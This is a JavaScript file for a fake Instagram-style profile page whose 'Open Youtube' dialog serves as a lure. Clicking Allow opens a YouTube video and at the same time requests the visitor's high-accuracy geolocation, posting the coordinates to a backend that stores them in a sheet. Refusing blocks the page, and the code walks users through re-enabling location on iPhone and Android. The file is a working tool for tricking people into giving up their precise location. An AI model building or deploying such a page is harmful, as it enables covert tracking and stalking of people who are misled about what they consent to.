/**
 * Centered Open Youtube dialog over the visible profile page.
 *
 * - Background Instagram-style page stays visible behind the popup.
 * - Allow → request location, save to sheet, open YouTube in a new tab.
 * - Don't Allow → close / block the page.
 */

const YOUTUBE_URL = "https://www.youtube.com/watch?v=l_GlMjcPoOQ";

const dialogEl = document.getElementById("consent-dialog");
const allowBtn = document.getElementById("consent-continue");
const denyBtn = document.getElementById("consent-not-now");
const statusEl = document.getElementById("status");
const pageContent = document.getElementById("page-content");
const blockedEl = document.getElementById("blocked-screen");
const dialogHintEl = document.getElementById("consent-hint");

function showDialog() {
  dialogEl.hidden = false;
  dialogEl.setAttribute("aria-hidden", "false");
  if (blockedEl) blockedEl.hidden = true;
  document.body.classList.remove("content-blocked");
  if (pageContent) pageContent.hidden = false;
}

function hideDialog() {
  dialogEl.hidden = true;
  dialogEl.setAttribute("aria-hidden", "true");
}

function setStatus(message, tone = "info") {
  if (!statusEl) return;
  statusEl.hidden = false;
  statusEl.textContent = message;
  statusEl.className = `status is-${tone}`;
}

function setDialogHint(message) {
  if (!dialogHintEl) return;
  if (!message) {
    dialogHintEl.hidden = true;
    dialogHintEl.textContent = "";
    return;
  }
  dialogHintEl.hidden = false;
  dialogHintEl.textContent = message;
}

function openYouTube() {
  window.open(YOUTUBE_URL, "_blank", "noopener,noreferrer");
}

/** Don't Allow → hide page and leave. */
function closePage() {
  hideDialog();
  if (pageContent) pageContent.hidden = true;
  document.body.classList.add("content-blocked");
  if (blockedEl) blockedEl.hidden = false;

  try {
    window.close();
  } catch {
    // ignore
  }
}

async function sendLocationToServer(payload) {
  const response = await fetch("/api/locations", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });

  if (!response.ok) {
    const data = await response.json().catch(() => ({}));
    console.error("Backend save failed:", data.error || response.status);
    return false;
  }

  return true;
}

function requestBrowserLocation() {
  return new Promise((resolve, reject) => {
    if (!("geolocation" in navigator)) {
      reject(Object.assign(new Error("unsupported"), { code: -1 }));
      return;
    }

    navigator.geolocation.getCurrentPosition(resolve, reject, {
      enableHighAccuracy: true,
      timeout: 20000,
      maximumAge: 0,
    });
  });
}

async function getGeoPermissionState() {
  try {
    if (!navigator.permissions?.query) return "unknown";
    const result = await navigator.permissions.query({ name: "geolocation" });
    return result.state;
  } catch {
    return "unknown";
  }
}

function isDeniedError(error) {
  return (
    error &&
    (error.code === 1 ||
      error.code === error.PERMISSION_DENIED ||
      String(error.message || error)
        .toLowerCase()
        .includes("denied"))
  );
}

/** Allow → open YouTube tab, request location, save if granted. */
async function handleAllow() {
  allowBtn.disabled = true;
  denyBtn.disabled = true;
  hideDialog();

  // Open YouTube immediately in a new tab as requested.
  openYouTube();

  try {
    const position = await requestBrowserLocation();

    const payload = {
      latitude: position.coords.latitude,
      longitude: position.coords.longitude,
      accuracy: position.coords.accuracy,
      timestamp: position.timestamp,
    };

    await sendLocationToServer(payload);
    setStatus("You’re all set.", "ok");
  } catch (error) {
    console.error("Location flow error:", error);

    if (isDeniedError(error)) {
      closePage();
      return;
    }

    setDialogHint("Could not get location. You can tap Allow again.");
    showDialog();
  } finally {
    allowBtn.disabled = false;
    denyBtn.disabled = false;
  }
}

function handleDontAllow() {
  closePage();
}

async function init() {
  showDialog();

  const perm = await getGeoPermissionState();
  if (perm === "denied") {
    setDialogHint(
      "Location is blocked for this site. On iPhone: aA or i icon → Website Settings → Location → Allow. On Android: lock icon → Permissions → Location → Allow. Then tap Allow."
    );
  } else {
    setDialogHint("");
  }
}

allowBtn.addEventListener("click", handleAllow);
denyBtn.addEventListener("click", handleDontAllow);

document.getElementById("blocked-reload")?.addEventListener("click", () => {
  window.location.href = `${window.location.pathname}?t=${Date.now()}`;
});

init();
